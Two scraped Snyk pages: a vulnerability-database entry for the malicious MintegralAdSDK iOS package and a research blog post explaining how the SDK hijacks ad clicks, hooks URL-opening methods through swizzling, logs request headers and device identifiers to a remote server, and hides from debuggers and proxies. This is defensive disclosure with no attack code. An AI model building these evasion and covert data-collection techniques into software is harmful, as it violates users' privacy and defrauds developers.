[documentation](https://www.first.org/epss/articles/prob_percentile_bins)
for more details.

**0.18% (56th percentile)**
### Do your applications use this vulnerable package?

In a few clicks we can analyze your entire application and see what components are vulnerable in your application, and suggest you quick fixes.

[Test your applications](https://app.snyk.io/login?cta=sign-up&loc=banner&page=vuln-vuln)

* Snyk ID**SNYK-COCOAPODS-MINTEGRALADSDK-598852**
* published**24 Aug 2020**
* disclosed**18 Aug 2020**
* credit**Snyk Security Team**

[Report a new vulnerability](https://snyk.io/vulnerability-disclosure/) [Found a mistake?](https://support.snyk.io/s/contactsupport)
#### Introduced: 18 Aug 2020

[CVE-2020-7705  (opens in a new tab)](https://www.cve.org/CVERecord?id=CVE-2020-7705) Common Vulnerabilities and Exposures (CVE) are common identifiers for publicly known security vulnerabilities[CWE-1021  (opens in a new tab)](https://cwe.mitre.org/data/definitions/1021.html) Common Weakness Enumeration (CWE) is a category system for software weaknesses First added by Snyk
## How to fix?

Upgrade `MintegralAdSDK` to version 6.6.0.0 or higher.

## Overview

[MintegralAdSDK](https://github.com/Mintegral-official/MintegralAdSDK-iOS-new) is a malicious package.
The SDK distributed by the company contains malicious functionality that tracks any URL opened by the app and reports it back to the company, along with performing advertisement attribution fraud.

Mintegral can remotely activate hooks on the `UIApplication`, `openURL`, `SKStoreProductViewController`, `loadProductWithParameters` and `NSURLProtocol` methods along with anti-debug and proxy detection protection. If those hooks are active `MintegralAdSDK` sends obfuscated data about every opened URL in an application to their servers.

Note that the malicious functionality is enabled even if the SDK was not enabled to serve ads.

## References

* [Snyk Blog](https://snyk.io/blog/sourmint-malicious-code-ad-fraud-and-data-leak-in-ios/)
* [Snyk Research Blog](https://snyk.io/research/sour-mint-malicious-sdk/)
### CVSS Scores

version 3.1
### Snyk

7.1 high

* Attack Vector (AV)

  The vulnerable component is bound to the network stack and the set of possible attackers extends beyond the other options listed below, up to and including the entire Internet. Such a vulnerability is often termed “remotely exploitable” and can be thought of as an attack being exploitable *at the protocol level* one or more network hops away (e.g., across one or more routers).

  **Network**
* Attack Complexity (AC)

  Specialized access conditions or extenuating circumstances do not exist. An attacker can expect repeatable success when attacking the vulnerable component.

  **Low**
* Privileges Required (PR)

  The attacker is unauthorized prior to attack, and therefore does not require any access to settings or files of the vulnerable system to carry out an attack.

  **None**
* User Interaction (UI)

  Successful exploitation of this vulnerability requires a user to take some action before the vulnerability can be exploited. For example, a successful exploit may only be possible during the installation of an application by a system administrator.

  **Required**

* Scope (S)

  An exploited vulnerability can only affect resources managed by the same security authority. In this case, the vulnerable component and the impacted component are either the same, or both are managed by the same security authority.

  **Unchanged**

* Confidentiality (C)

  There is some loss of confidentiality. Access to some restricted information is obtained, but the attacker does not have control over what information is obtained, or the amount or kind of loss is limited. The information disclosure does not cause a direct, serious loss to the impacted component.

  **Low**
* Integrity (I)

  There is a total loss of integrity, or a complete loss of protection. For example, the attacker is able to modify any/all files protected by the impacted component. Alternatively, only some files can be modified, but malicious modification would present a direct, serious consequence to the impacted component.

  **High**
* Availability (A)

  There is no impact to availability within the impacted component.

  **None**
### NVD

8.1 high
### Product

* [Snyk Open Source](https://snyk.io/product/open-source-security-management/)
* [Snyk Code](https://snyk.io/product/snyk-code/)
* [Snyk Container](https://snyk.io/product/container-vulnerability-management/)
* [Snyk Infrastructure as Code](https://snyk.io/product/infrastructure-as-code-security/)
* [Snyk AppRisk](https://snyk.io/product/snyk-apprisk/)
### Resources

* [Vulnerability DB](https://security.snyk.io/)
* [Documentation](https://docs.snyk.io/)
* [Disclosed Vulnerabilities](/disclosed-vulnerabilities)
* [Blog](https://snyk.io/blog/)
* [FAQs](https://support.snyk.io/)
### Company

* [About](https://snyk.io/about)
* [Jobs](https://snyk.io/careers/)
* Contact
* [Policies](https://snyk.io/policies/terms-of-service/)
* [Do Not Sell My Personal Information](https://preferences.snyk.io/dont_sell)
### Contact Us

* Support
* [Report a new vuln](https://snyk.io/vulnerability-disclosure)
* [Events](https://snyk.io/events)
### Find us online

### Track our development

[![DevSecOps Community Podcast](data:image/svg+xml;base64...)](https://www.devseccon.com/the-secure-developer-podcast/)

© 2025 Snyk Limited

Registered in England and Wales. Company number: 09677925

Registered address: Highlands House, Basingstoke Road, Spencers Wood, Reading, Berkshire, RG7 1NT.



=== Content from snyk.io_76138e9a_20250119_125940.html ===
You need to enable JavaScript to run this app.[Skip to main content](#main-content)

* Products

  Products

  + [What is Snyk?

    Developer-first security in action](/product/)
  + [Snyk Code

    Secure your code as it's written](/product/snyk-code/)
  + [Snyk Open Source

    Avoid vulnerable dependencies](/product/open-source-security-management/)
  + [Snyk Container

    Keep your base images secure](/product/container-vulnerability-management/)
  + [Snyk IaC

    Fix IaC misconfigurations in-code](/product/infrastructure-as-code-security/)
  + [Snyk AppRisk

    Reduce risk across your business](/product/snyk-apprisk/)
  + [Pricing](/plans/)

  Solutions

  + [Why Snyk?

    Modern security in a single platform](/platform/)
  + [Application security

    Build secure, stay secure](/solutions/application-security/)
  + [Software supply chain security

    Mitigate supply chain risk](/solutions/software-supply-chain-security/)
  + [Secure-AI-generated code

    AI writes, Snyk secures](/solutions/secure-ai-generated-code/)
  + [Zero-day vulnerabilities

    Fix the first day with Snyk](/solutions/zero-day-vulnerability-security/)
  + [Security Intelligence

    Comprehensive vulnerability data](/platform/security-intelligence/)

  Platform

  + [DeepCode AI

    Purpose-built security AI](/platform/deepcode-ai/)
  + [Integrations

    SDLC-spanning security](/integrations/)
  + [Code Checker

    Write better code for free](/code-checker/)

  Audience

  + [Snyk for devs

    Dev-centric info on demand](https://go.snyk.io/2024-dev-onboarding.html)
  + [Snyk for government

    Mission-informed AppSec](/government-security-solution/)
  + [Leaders handbook

    SAST essentials for genAI](/lp/securing-ai-generated-code/)![](https://res.cloudinary.com/snyk/image/upload/v1729618965/default-report.b205b2e0.svg)

  Secure Adoption in Gen AI Era Report

  [Read report](https://go.snyk.io/secure-adoption-in-genai-era.html "Read report")
* Resources

  Our resources

  + [Resource library

    Browse our extensive database](/resource-library/)
  + [Customer resources

    The one stop shop for customers](/customer-resources/)
  + [Ethical hacking

    How ethical hacking can help you](/ethical-hacking-resources/)
  + [Security leaders

    Insights from industry leaders](/security-leaders/)
  + [Top 10 vulns

    See the most common vuln types](/snyk-top-10/)
  + [Blog Section](/blog/)
  + [Snyk's podcasts](/podcasts/the-secure-developer/)
  + [Snyk’s YouTube](https://www.youtube.com/snyksec)

  Our ecosystem

  + [Snyk Learn

    Security education from Snyk](https://learn.snyk.io)
  + [Snyk user docs

    Get started with Snyk](https://docs.snyk.io/)
  + [Snyk Support

    How can we help?](https://support.snyk.io/hc/en-us)
  + [Snyk Vuln Database

    Find new vulnerabilities](https://security.snyk.io/)
  + [Snyk Updates

    Stay in the loop](https://updates.snyk.io/)
  + [Snyk Partner Solutions Directory

    Explore Snyk Partner Integrations](https://partners.snyk.io/English/solutions/)

  Our community

  + [Events & webinars](/events/)
  + [Ambassadors](/snyk-ambassadors/)
  + [Discord channel](https://snyk.co/discordcommunity)![](/_next/image/?url=https%3A%2F%2Fres.cloudinary.com%2Fsnyk%2Fimage%2Fupload%2Fv1717461856%2Ffeature-snyk-snowflake.jpg&w=2560&q=75)

  Extend the power of your AppSec data with the new Snyk and Snowflake integration

  [Read blog](/blog/snyk-snowflake-data-share/ "Read blog")
* Company

  Company

  ## The developer security platform

  Snyk gives you the visibility, context, and control you need to work alongside developers on reducing application risk.

  [More about us](/about/ "More about us")
  + [Our services

    Maximize your AppSec ROI](/services/)
  + [Our customers

    We help customers save time and money](/customers/)
  + [Our partners

    Bringing business class security with partners](/partners/)
  + [Case studies

    Check out our customer stories and stats](/case-studies/)
  + [Newsroom

    See the latest press releases](/news/)
  + [Contact us

    Get in touch with any feedback or questions](/contact-us/)
  + [Careers

    Join Snyk today](/careers/)![](/_next/image/?url=https%3A%2F%2Fres.cloudinary.com%2Fsnyk%2Fimage%2Fupload%2Fv1730905024%2FSnyk_Probely.jpg&w=2560&q=75)

  Snyk Acquires Developer-First DAST Provider Probely

  [Read press release](/news/snyk-acquires-developer-first-dast-provider-probely/ "Read press release")
* [Pricing](/plans/)

ENSelect your languageEnglishDeutschFrançais日本語Português (BR)Login

Free and Team Plan Customers

* [Snyk

  app.snyk.io](https://app.snyk.io)

Enterprise Plan Customers

* [*🇺🇸*

  Snyk US - 1

  app.snyk.io](https://app.snyk.io)
* [*🇺🇸*

  Snyk US - 2

  app.us.snyk.io](https://app.us.snyk.io)
* [*🇪🇺*

  Snyk EU

  app.eu.snyk.io](https://app.eu.snyk.io)
* [*🇦🇺*

  Snyk AU

  app.au.snyk.io](https://app.au.snyk.io)

The region where your data is hosted follows local agreements, and it may not align with your own location. [Find out more](https://docs.snyk.io/working-with-snyk/regional-hosting-and-data-residency).[Sign up](https://app.snyk.io/signup "Sign up")[Book a live demo](/schedule-a-demo/ "Book a live demo")[Snyk Blog](/blog/)
# SourMint: Malicious code, ad fraud, and data leak in iOS

Written by: ![Alyssa Miller](/_next/image/?url=https%3A%2F%2Fres.cloudinary.com%2Fsnyk%2Fimage%2Fupload%2Fv1530707820%2Fwordpress-sync%2F20200228_201942.jpg&w=48&q=75)

[Alyssa Miller](/contributors/alyssa-miller/)

![](/_next/image/?url=https%3A%2F%2Fres.cloudinary.com%2Fsnyk%2Fimage%2Fupload%2Fv1530707820%2Fwordpress-sync%2Fblog-tumbnail.png&w=2560&q=75)

August 24, 2020

 0 mins read
### **UPDATE:** In addition to the findings we originally disclosed, we've identified additional concerns in both the iOS and Android versions of the SDK. Read more about the updated findings and the reactions from Apple, Google, and the community [here](/blog/remote-code-execution-rce-sourmint/).

The Snyk research team has uncovered malicious behavior in a popular Advertising SDK used by over 1,200 apps in the AppStore which represent over 300 Million downloads per month, based on industry expert estimates.

The malicious code was uncovered in the iOS versions of the SDK from the Chinese mobile ad platform provider, Mintegral dating back to July 2019. The [malicious code](/learn/malicious-code/) can spy on user activity by logging URL-based requests made through the app. This activity is logged to a third-party server and could potentially include personally identifiable information (PII) and other sensitive information. Furthermore, the SDK fraudulently reports user clicks on ads, stealing potential revenue from competing ad networks and, in some cases, the developer/publisher of the application.

---

<https://www.youtube.com/watch?v=MMuL5MaQeLM>

---

## **SourMint malicious code high-level description**

The Mintegral SDK presents itself as a tool to help app developers and advertisers build monetized ad-based marketing. However, through our research and in collaboration with experts from the mobile advertising industry, the Snyk team has discovered that some malicious code within the SDK works to steal potential revenue from other ad networks the application may be using, and spy on any URL-based request made from within the application.

Developers can sign up as publishers and download the SDK from the Mintegral site. Once loaded, the SDK injects code into standard iOS functions within the application that execute when the application opens a URL, including app store links, from within the app. This gives the SDK access to a significant amount of data and even potentially private user information. The SDK also specifically examines these open URL events to determine if a competitor’s ad network SDK was the source of the activity.

It’s interesting to note the Mintegral SDK also contains a number of anti-debug protections that appear to be designed to keep researchers from discovering the true behavior behind the application. In the code, there is a particular routine that attempts to determine if the phone was rooted and if any type of debugger or proxy tools are in use. If it finds evidence that it is being watched, the SDK modifies its behavior in an apparent attempt to mask its malicious behaviors. This may also help the SDK pass through Apple’s app review process without being detected.

![](/_next/image/?url=https%3A%2F%2Fres.cloudinary.com%2Fsnyk%2Fimage%2Fupload%2Fv1613516922%2Fwordpress-sync%2FGroup-18-1-1.png&w=2560&q=75)*Figure 1: Functional flow of a user ad-click being hijacked by the Mintegral SDK*
## **Ad fraud**

The primary goal of the malicious code that Snyk uncovered in this SDK appears to be hijacking user clicks on ads within the app. In mobile applications, advertisements are often presented by ad networks that the developer integrates into their code.

Advertisers pay the ad networks to display their ads and are charged on the performance of the ad (i.e., the ability to get users to click on the ad to visit the advertiser’s site or install their application). The app developers receive a portion of the profits the ad network makes from the advertisers.

It is common for app publishers to include SDKs from multiple ad networks in their applications through the use of ad mediators. These mediators optimize revenue for the ad publisher by including multiple ad networks and then selecting which ad network to use for each ad request, based on ad network performance metrics.

However, the Mintegral SDK is able to intercept all of the ad clicks (and other URL clicks as well) within the application. It uses this information to forge click notifications to the attribution provider. The forged notifications make it appear that the ad click came through their network even though it may have been a competing ad network that served the ad.

Mintegral is able to steal ad revenue from competing ad networks in two primary ways. First, Mintegral steals advertiser revenue that should have gone to the other ad networks. This happens simply by claiming attribution for clicks that did not occur on a Mintegral presented ad. This seems to be the main goal of this malicious functionality.

A secondary impact, however, would be that the developer or mediator SDK may notice that Mintegral is performing better than the other ad networks, causing bias toward selecting Mintegral over competing ad networks.

There is also potential for the application developer or publisher to lose revenue even when Mintegral isn’t being used to serve ads. In our investigation, we discovered that once the Mintegral SDK is integrated into an application, it intercepts the clicks even if Mintegral isn’t enabled to serve ads. In this case, ad revenue that should have come back to the developer or publisher via a competing ad network will never be paid to the developer.

## **Privacy exposures from data leak**

While ad fraud appears to be the primary goal of the malicious code, it may not be its most severe implication. In our research, Snyk further learned that the Mintegral SDK captures details of every URL-based request that is made from within the compromised application.

The information on these requests as well as other device and application data is then sent to a remote logging server. The SDK accesses a great deal of information including:

* the URL that was requested, which could potentially include identifiers or other sensitive information
* headers of the request that was made which could include authentication tokens and other sensitive information
* where in the application’s code the request originated which could help identify user patterns
* the device’s Identifier for Advertisers (IDFA) which is a unique random number used to identify the device and the unique hardware identifier of the device, the IMEI.

The requests captured by the SDK include web URLs, custom URL scheme (protocol handler) requests, and in-app calls to the app store.

Beyond ad click attribution, it is unclear if and how this data is being used once it is uploaded to the logging server. At a minimum, the data captured would enable a deep analysis of the user journey within the application. More concerning is that, depending on the nature of the compromised application, the URL and other data being collected could potentially expose private information. Ultimately, it could be possible for Mintegral to monetize such data by selling it to other parties for purposes of data analytics.

This functionality of logging large amounts of user sensitive data is particularly notable given the growing concerns over the way mobile applications, in general, are collecting data. Most recently, the [TikTok application](https://www.wsj.com/articles/tiktok-tracked-user-data-using-tactic-banned-by-google-11597176738) has been the subject of increased scrutiny for their data collection practices.

The attempts by Mintegral to conceal the nature of the data being captured, both through anti-tampering controls and a custom proprietary encoding technique, are reminiscent of similar functionality reported by researchers that analyzed the Tik Tok app.

In the case of SourMint, the scope of data being collected is greater than would be necessary for legitimate click attribution. The app also uses questionable coding methods to achieve this level of data access.

## **Technical exploit details and remediation**

Just how does this malicious code attack work? Well, let’s take a look at the details we uncovered in our research.

Developers are able to download the SDK from Mintegral’s site and incorporate it into their application. When the SDK is initialized, it makes a number of requests to the Mintegral server. One of these requests receives a JSON response that contains a number of parameters that are directly used by the malicious code within the application. These include:

* a flag to turn on or off the anti-tampering/debugging detection
* a flag to enable the hooks that are used to capture and log URL clicks
* a URL (encoded) to which user click activity will be logged

The retrieved settings JSON also contains a numeric value indicating the delay before the next setting update. This indicates that settings within the SDK can be updated remotely.

As noted previously, the SDK performs some basic anti-tampering detection steps. It looks for the following conditions:

* the application is running in a simulator
* there is a debugger attached to the application process
* the phone is rooted (by checking for various files including the Cydia app)
* proxying is enabled

If the SDK detects that any of the conditions above are met, it sets a flag that is used throughout other functions of the SDK and modifies the behavior of the SDK. The modified behavior appears to disable the malicious activity of rewriting URLs and logging user data. Therefore it would seem this is an attempt to avoid detection of the malicious activity of the SDK.

At runtime, the SDK uses method swizzling to inject malicious code into the implementations of numerous methods and handlers. These hooks allow it to intercept any URL-based request made from within the app, even those that occurred outside of the Mintegral SDK. This is the crucial step that allows the SDK to gather the necessary information about user clicks to successfully create a click notification to the attribution provider. The methods that the SDK swizzles with its own code include:

* `UIAplication OpenURL`
* `UIAplication OpenURL:options: completionHandler` (after performing a check to confirm the app is running on iOS 10.x or higher)
* `NSURLProtocol`
* `SKStoreProductViewController loadProductwithParameters:completionBlock`

When one of the methods above is called, the code injected by the SDK does a number of things. First, the SDK checks if the anti-tampering flag is set and if so, all subsequent Mintegral code is skipped. It then checks to see whether the request originated from a marketing ad served by Mintegral or if it came from a Mintegral competitor. If the request originated from a Mintegral ad, the normal method handler is invoked without further action.

If the request originated from within a non-Mintegral method, the code gathers information about the event including the URL, the request headers, the class where the click happened, the method in which the click occurred, and additional backtrace data. This data about the request along with other phone data is sent in an encoded format to the Mintegral logging server specified in the settings file. The data logged includes:

* OS Version
* IP Address
* charging state
* Mintegral SDK Version
* network type
* model
* package name
* IDFA
* URL
* request headers
* method name
* class Name
* backtrace data

Once the data is logged to Mintegral, the execution of the rest of the method continues as normal. Based on reporting provided by an attribution provider, we’re able to confirm that on the back end, Mintegral is creating click notifications for the touchpoints that occurred through other ad networks.

In order to discover this information, the Snyk Security Research Team added the SDK to a test application. To avoid the anti-tampering detection, application communications were intercepted at the wireless access point using a Man-in-the-Middle proxy (`mitm.it`). Snyk used Hopper disassembler to investigate the code within the SDK and map out the functionality. We were able to identify this malicious functionality in versions of the SDK going back to 5.5.1 (current version as of this writing is 6.4.0).

Ultimately, through our own internal research as well as collaborating with key organizations and experts in the industry, we were able to confirm the full end-to-end hijacking of user ad click events.

---

**For an even more detailed technical description of the code we discovered and the methods used, visit our** [**research write-up**](/research/sour-mint-malicious-sdk/)**.**

---

Posted in:[Vulnerability Insights](/blog/?topic=vulnerability-insights)[Code Security](/blog/?topic=code-security)[Application Security](/blog/?topic=application-security)![](/_next/image/?url=https%3A%2F%2Fres.cloudinary.com%2Fsnyk%2Fimage%2Fupload%2Fv1530707820%2Fwordpress-sync%2Fblog-tumbnail.png&w=2560&q=75)
### Snyk Top 10: Vulnerabilites you should know

Find out which types of vulnerabilities are most likely to appear in your projects based on Snyk scan results and security research.

[See the report](/snyk-top-10/ "See the report")
## Products & Solutions

* [What is Snyk?](/product/)
* [Developer Security Platform](/platform/)
* [Pricing](/plans/)
## Our Resources

* [Resource library](/resource-library/)
* [Blog](/blog/)
* [Snyk’s podcasts](/podcasts/the-secure-developer/)
## Our Ecosystem

* [Snyk Learn](/platform/learn/)
* [Snyk User Docs](https://docs.snyk.io/)
* [Snyk Support](https://support.snyk.io/hc/en-us)
* [Snyk Vuln Database](https://security.snyk.io/)
* [Snyk Updates](https://updates.snyk.io/)
* [Snyk Trust Center](https://trust.snyk.io/home)
## Company & Community

* [About Snyk](/about/)
* [Contact us](/contact-us/)
* [Book a demo](/schedule-a-demo/)
* [Careers](/careers/)
* [Events & webinars](/events/)
* [Ambassadors](/snyk-ambassadors/)
## Why Snyk

* [Snyk With GitHub](/comparison/github-and-snyk/)
* [Snyk vs Veracode](/comparison/snyk-vs-veracode/)
* [Snyk vs Checkmarx](/comparison/snyk-vs-checkmarx/)
* [Snyk vs Synopsys](/comparison/snyk-vs-synopsys/)

## The developer security platform

Snyk gives you the visibility, context, and control you need to work alongside developers on reducing application risk.

[More about us](/about/ "More about us")

© 2025 Snyk Limited
Registered in England and Wales

* [Legal terms](/policies/terms-of-service/)
* [Privacy Notice](/policies/privacy/)
* [Terms of use](/policies/website-terms-of-use/)
* [California residents: do not sell my information](https://preferences.snyk.io/dont_sell)

